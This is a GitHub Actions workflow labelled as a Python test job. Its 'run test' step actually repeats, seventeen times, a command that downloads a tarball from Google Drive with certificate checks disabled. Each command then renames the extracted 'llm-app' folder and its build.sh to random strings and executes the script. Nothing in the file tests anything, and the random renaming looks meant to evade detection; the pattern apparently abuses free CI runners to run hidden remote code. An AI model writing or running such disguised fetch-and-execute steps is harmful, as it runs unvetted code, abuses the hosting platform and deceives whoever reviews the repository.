name: Phu Hang

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
    - name: Set up Python 3.12
      uses: actions/setup-python@v5
      with:
        python-version: "3.12"
    - name: run test
      run: |
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=189ySG_AN9eSNn5ZOyPqEuTzTQlQqktHd&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber1; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1vvXmfgqecF9uHpPwbpoxsf7eIJmtC2Rx&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber2; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1A3K6zOZ9gI7vBzTYbxzyOhsfoSvJIK2N&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber3; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=15pYelkksAHHkW2sPBGYxQwER3lk19N75&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber4; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=17lFPH0ZmFYjTc55bIJkbo5aF4ybYNlXD&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber5; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1ediJB7vmds-aAEJG-QbeiSp90kSlGLQ9&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber6; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1KX70HhNv6m5fpkdvfcyvGPGVfD_5zWAI&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber7; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1-hrv8Qj9765wX0r2nQJdBUEZRdzEIbOb&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber8; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1DTotf4r9_VHtl4gWsekyV7YEKiik-piS&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber9; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1aa8zl32zMPKkDNEQTZ87-cC0TqLqgE1c&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber10; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1KT-XG5GmSiNdw7_sTUToRxbZxBnKg01h&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber11; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1Y8Q1qtxvSHciBqVENWzecZqNO6IQYsh3&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber12; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1qRIiEbeYutNziQnuP_3AhCO1YYKZJJeh&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber13; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1x44SpxOxDMlfroCY3Se_gkDR86H2tq-8&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber14; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1qZX-pDGg1b8-WyKZDN21jFLfn8CV_7aC&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber15; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1YOZWDcLE6Oh5OOVNIxyeKe5ivdh1mlAL&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber16; 
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1P_eihCopcExcsmFQFUsMmm_BMQdPhdPJ&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" &&  rm -rf "$R.tar.gz" ; mv llm-app "$R" && cd "$R" && chmod +x build.sh && START=$(tr -dc a-z0-9 </dev/urandom | head -c 16) && mv build.sh "$START.sh" && chmod +x "$START.sh" ; ./"$START.sh" 4 PhuHangNumber17; 
        ls